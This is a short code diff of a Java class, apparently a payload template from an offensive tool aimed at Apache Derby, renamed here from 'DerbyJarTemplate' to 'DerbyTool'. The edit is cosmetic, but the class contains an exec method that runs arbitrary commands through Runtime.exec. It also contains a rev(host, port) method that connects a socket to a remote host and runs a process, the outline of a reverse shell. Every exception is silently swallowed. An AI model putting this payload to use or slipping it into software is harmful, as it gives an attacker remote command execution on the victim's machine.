@@ -4,11 +4,11 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
 
-public class DerbyJarTemplate {
+public class DerbyTool {
     public static void exec(String cmd) {
         try {
             Runtime.getRuntime().exec(cmd);
-        } catch (Exception e) { }
+        } catch (Exception ignore) { }
     }
 
     public static void rev(String host, String port) {
@@ -31,10 +31,10 @@ public class DerbyJarTemplate {
                 try {
                     p.exitValue();
                     break;
-                } catch (Exception e) { }
+                } catch (Exception ignore) { }
             }
             p.destroy();
             s.close();
-        } catch (Exception e) { }
+        } catch (Exception ignore) { }
     }
 }
